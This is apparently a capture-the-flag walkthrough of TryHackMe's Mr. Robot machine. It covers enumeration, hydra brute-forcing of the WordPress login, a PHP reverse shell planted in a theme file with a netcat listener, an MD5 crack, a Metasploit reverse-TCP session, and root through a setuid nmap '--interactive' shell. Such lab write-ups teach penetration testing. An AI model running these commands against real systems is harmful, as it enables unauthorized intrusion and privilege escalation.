![](https://github.com/josemlwdf/Writeups/blob/main/MrRobot/images/image5.png?raw=true)
Mr.Robot is an Easy difficulty Linux machine of TryHackMe. Here we will find a Wordpress site and we will take advantage of a provided dictionary to attack the login form, allowing us to put a php reverse shell on the site to get a foothold.After that, Linux Smart Enum will show us that we have access to Nmap that is owned by root and that’s our Privilege Escalation.
 

 
ENUMERATION
Lets begin as always with an Nmap Scan:
[+] Nmap XML import started
[+] =====================
[+] Processing: 10.10.96.6
[+] Searching for IP: 10.10.96.6
[+] Host found: /e/86O4kmxp#host/Da0ZQRNx
[+] Adding port: 22 / tcp / closed / ssh
[+] Adding port: 80 / tcp / open / http / Apache httpd
[+] Adding port: 443 / tcp / open / http / Apache httpd

WEB SITE



After someanumeration of the site we find:
WordPress 4.3.1
PHP 5.5.29
X-Mod-Pagespeed 1.9.32.3-4523
jQuery 2.1.3
Lets use Gobuster to see if we can get some interesting files/dirs
┌──(root㉿Kali)-[~]
└─# gobuster dir -u http://10.10.96.6 -w /usr/share/seclists/Discovery/Web-Content/common.txt
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.212.109
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2022/07/05 21:19:02 Starting gobuster in directory enumeration mode
===============================================================
/.hta                 (Status: 403) [Size: 213]
/.htaccess            (Status: 403) [Size: 218]
/.htpasswd            (Status: 403) [Size: 218]
/0                    (Status: 301) [Size: 0] [--> http://10.10.212.109/0/]
/Image                (Status: 301) [Size: 0] [--> http://10.10.212.109/Image/]
/admin                (Status: 301) [Size: 235] [--> http://10.10.212.109/admin/]
/atom                 (Status: 301) [Size: 0] [--> http://10.10.212.109/feed/atom/]
/audio                (Status: 301) [Size: 235] [--> http://10.10.212.109/audio/]
/blog                 (Status: 301) [Size: 234] [--> http://10.10.212.109/blog/]
/css                  (Status: 301) [Size: 233] [--> http://10.10.212.109/css/]
/dashboard            (Status: 302) [Size: 0] [--> http://10.10.212.109/wp-admin/]
/favicon.ico          (Status: 200) [Size: 0]
/feed                 (Status: 301) [Size: 0] [--> http://10.10.212.109/feed/]
/images               (Status: 301) [Size: 236] [--> http://10.10.212.109/images/]
/image                (Status: 301) [Size: 0] [--> http://10.10.212.109/image/]
/index.html           (Status: 200) [Size: 1077]
/index.php            (Status: 301) [Size: 0] [--> http://10.10.212.109/]
/intro                (Status: 200) [Size: 516314]
/js                   (Status: 301) [Size: 232] [--> http://10.10.212.109/js/]
/license              (Status: 200) [Size: 309]
/login                (Status: 302) [Size: 0] [--> http://10.10.212.109/wp-login.php]
/page1                (Status: 301) [Size: 0] [--> http://10.10.212.109/]
/phpmyadmin           (Status: 403) [Size: 94]
/readme               (Status: 200) [Size: 64]
/rdf                  (Status: 301) [Size: 0] [--> http://10.10.212.109/feed/rdf/]
/render/https://www.google.com (Status: 301) [Size: 0] [--> http://10.10.212.109/render/https:/www.google.com]
/robots               (Status: 200) [Size: 41]
/robots.txt           (Status: 200) [Size: 41]
/rss                  (Status: 301) [Size: 0] [--> http://10.10.212.109/feed/]
/rss2                 (Status: 301) [Size: 0] [--> http://10.10.212.109/feed/]
/sitemap              (Status: 200) [Size: 0]
/sitemap.xml          (Status: 200) [Size: 0]
/video                (Status: 301) [Size: 235] [--> http://10.10.212.109/video/]
/wp-admin             (Status: 301) [Size: 238] [--> http://10.10.212.109/wp-admin/]
/wp-content           (Status: 301) [Size: 240] [--> http://10.10.212.109/wp-content/]
/wp-includes          (Status: 301) [Size: 241] [--> http://10.10.212.109/wp-includes/]
/wp-cron              (Status: 200) [Size: 0]
/wp-config            (Status: 200) [Size: 0]
/wp-links-opml        (Status: 200) [Size: 227]
/wp-load              (Status: 200) [Size: 0]
/wp-login             (Status: 200) [Size: 2671]
/wp-mail              (Status: 500) [Size: 3064]
/wp-settings          (Status: 500) [Size: 0]
/wp-signup            (Status: 302) [Size: 0] [--> http://10.10.212.109/wp-login.php?action=register]
/xmlrpc               (Status: 405) [Size: 42]
/xmlrpc.php           (Status: 405) [Size: 42]

===============================================================
2022/07/05 22:01:19 Finished
===============================================================


Ok, so we got us /robots.txt and /wp-login. Lets check the robots.txt
User-agent: *
fsocity.dic
key-1-of-3.txt

key-1-of-3.txt: The 1st key
fsocity.dic: File to download (Wordlist)
Lets search for vulns on our Wordpress using wpscan.
wpscan --url http://10.10.187.95 -e
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | ''_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.22
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: http://10.10.187.95/ [10.10.187.95]
[+] Started: Fri Jul  8 22:48:32 2022

Interesting Finding(s):

[+] Headers
 | Interesting Entries:
 |  - Server: Apache
 |  - X-Mod-Pagespeed: 1.9.32.3-4523
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] robots.txt found: http://10.10.187.95/robots.txt
 | Found By: Robots Txt (Aggressive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://10.10.187.95/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] The external WP-Cron seems to be enabled: http://10.10.187.95/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 4.3.1 identified (Insecure, released on 2015-09-15).
 | Found By: Emoji Settings (Passive Detection)
 |  - http://10.10.187.95/373ff23.html, Match: 'wp-includes\/js\/wp-emoji-release.min.js?ver=4.3.1'
 | Confirmed By: Meta Generator (Passive Detection)
 |  - http://10.10.187.95/373ff23.html, Match: 'WordPress 4.3.1'

[+] WordPress theme in use: twentyfifteen
 | Location: http://10.10.187.95/wp-content/themes/twentyfifteen/
 | Last Updated: 2022-05-24T00:00:00.000Z
 | Readme: http://10.10.187.95/wp-content/themes/twentyfifteen/readme.txt
 | [!] The version is out of date, the latest version is 3.2
 | Style URL: http://10.10.187.95/wp-content/themes/twentyfifteen/style.css?ver=4.3.1
 | Style Name: Twenty Fifteen
 | Style URI: https://wordpress.org/themes/twentyfifteen/
 | Description: Our 2015 default theme is clean, blog-focused, and designed for clarity. Twenty Fifteens simple, st...
 | Author: the WordPress team
 | Author URI: https://wordpress.org/
 |
 | Found By: Css Style In 404 Page (Passive Detection)
 |
 | Version: 1.3 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://10.10.187.95/wp-content/themes/twentyfifteen/style.css?ver=4.3.1, Match: 'Version: 1.3'

[+] Enumerating Vulnerable Plugins (via Passive Methods)

[i] No plugins Found.

[+] Enumerating Vulnerable Themes (via Passive and Aggressive Methods)
 Checking Known Locations - Time: 00:02:08 <==============================================================================================> (472 / 472) 100.00% Time: 00:02:08
[+] Checking Theme Versions (via Passive and Aggressive Methods)

[i] No themes Found.

[+] Enumerating Timthumbs (via Passive and Aggressive Methods)
 Checking Known Locations - Time: 00:10:42 <============================================================================================> (2575 / 2575) 100.00% Time: 00:10:42

[i] No Timthumbs Found.

[+] Enumerating Config Backups (via Passive and Aggressive Methods)
 Checking Config Backups - Time: 00:00:34 <===============================================================================================> (137 / 137) 100.00% Time: 00:00:34

[i] No Config Backups Found.

[+] Enumerating DB Exports (via Passive and Aggressive Methods)
 Checking DB Exports - Time: 00:00:17 <=====================================================================================================> (71 / 71) 100.00% Time: 00:00:17

[i] No DB Exports Found.

[+] Enumerating Medias (via Passive and Aggressive Methods) (Permalink setting must be set to "Plain" for those to be detected)
 Brute Forcing Attachment IDs - Time: 00:00:05 <==========================================================================================> (100 / 100) 100.00% Time: 00:00:05

[i] Medias(s) Identified:

[+] http://10.10.187.95/?attachment_id=2
 | Found By: Attachment Brute Forcing (Aggressive Detection)

[+] Enumerating Users (via Passive and Aggressive Methods)
 Brute Forcing Author IDs - Time: 00:00:00 <================================================================================================> (10 / 10) 100.00% Time: 00:00:00

[i] No Users Found.

[!] No WPScan API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register

[+] Finished: Fri Jul  8 23:02:35 2022
[+] Requests Done: 3419
[+] Cached Requests: 10
[+] Data Sent: 931.095 KB
[+] Data Received: 1.325 MB
[+] Memory used: 279.711 MB
[+] Elapsed time: 00:14:02

EXPLOITATION
Nothing great from wpscan so lets give a try to our dictionary file.
We clean duplicates from our fsocity.dic
sort -u fsocity.dic > clean.dic

Now we use our clean.dic to perform a dictionary based attack with Burpsuite in our WP Login page "/wp-login"
First, lets clean a little more our wordlist to get some valid usernames:
cat wordlistsorted.dic | grep -v -e '^[0-9]' -e 'ABC' > usernames.dic

We will use hydra:
First lets get us a valid username:
hydra -L /root/Downloads/usernames.dic -p '123' 10.10.96.6 -V http-form-post '/wp-login:log=^USER^&pwd=^PASS^&wp-submit=Log In&testcookie=1:F=Invalid' -t 30

After a little time we got a HIT. Great!!!
Now let's go for the password:
hydra -l 'Elliot' -P /root/Downloads/usernames.dic 10.10.96.6 -V http-form-post '/wp-login:log=^USER^&pwd=^PASS^&wp-submit=Log In&testcookie=1:F=The password you entered for the username' -t 30

Finally we have access.
[ATTEMPT] target 10.10.27.211 - login "Elliot" - pass "Episodic" - 840 of 8198 [child 41] (0/0)
[ATTEMPT] target 10.10.27.211 - login "Elliot" - pass "Eps" - 841 of 8198 [child 22] (0/0)
[ATTEMPT] target 10.10.27.211 - login "Elliot" - pass "Eps1" - 842 of 8198 [child 37] (0/0)
[ATTEMPT] target 10.10.27.211 - login "Elliot" - pass "Eric" - 843 of 8198 [child 40] (0/0)
[80][http-post-form] host: 10.10.27.211   login: Elliot   password: ????????
1 of 1 target successfully completed, 1 valid password found

Elliot : ER28-0652

Inside of WordPress go to:
Appareance
Editor
Select one of the PHP files on the right to overwrite it with a reverse shell. I used archive.php

Put a reverse PHP shell inside and update the file
Now lets just set up our listener
nc -nlvp 4444
Listening on 0.0.0.0 4444

And visit our php file modified to activate our reverse shell
http://10.10.187.95/wp-content/themes/twentyfifteen/archive.php

Lets check our connection:
Connection received on 10.10.187.95 55318
SOCKET: Shell has connected! PID: 2149
id
uid=1(daemon) gid=1(daemon) groups=1(daemon)
ls /home
robot
cd /home/robot
ls
key-2-of-3.txt
password.raw-md5
cat key-2-of-3.txt
cat: key-2-of-3.txt: Permission denied
cat password.raw-md5
robot:c3fcd3d76192e4007dfb496cca67e13b

From Crackstation we get this:


username: robot, password: abcdefghijklmnopqrstuvwxyz
using those credentials we utilize the exploit exploit/linux/local/su_login from Metasploit and we logs in as user
[*] Started reverse TCP handler on 10.18.44.7:4445
[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target appears to be vulnerable.
[*] Uploading payload to target
[*] Attempting to login with su
[*] Sending stage (989032 bytes) to 10.10.199.17
[*] Meterpreter session 3 opened (10.18.44.7:4445 -> 10.10.199.17:60427) at 2022-07-10 14:33:15 +0200

meterpreter > shell
Process 2113 created.
Channel 1 created.
id
uid=1002(robot) gid=1002(robot) groups=1002(robot)


At this point we have the 2nd key.
python -c 'import pty; pty.spawn("/bin/bash");'

POST EXPLOITATION
We get this from Linux_Smart_Enum:
============================================================( file system )=====
[*] fst000 Writable files outside user's home..............................
 yes!
[*] fst010 Binaries with setuid bit........................................ yes!
[!] fst020 Uncommon setuid binaries........................................ yes!
---
/usr/local/bin/nmap
/usr/lib/vmware-tools/bin32/vmware-user-suid-wrapper
/usr/lib/vmware-tools/bin64/vmware-user-suid-wrapper
[*] sys050 Can root user log in via SSH?................................... yes!
[*] ret020 Cron jobs....................................................... yes!
[!] cve-2021-3156 Sudo Baron Samedit vulnerability......................... yes!
---
Vulnerable! sudo version: 1.8.9p5
---

looking at Nmap in GTFOBins we get this

ROOT
robot@linux:/tmp$ /usr/local/bin/nmap --interactive
/usr/local/bin/nmap --interactive

Starting nmap V. 3.81 ( http://www.insecure.org/nmap/ )
Welcome to Interactive Mode -- press h <enter> for help
nmap> !sh
!sh
# whoami
whoami
root
#

Boom, we finished this machine in a very short time. Congrats and thanks for read!!! 
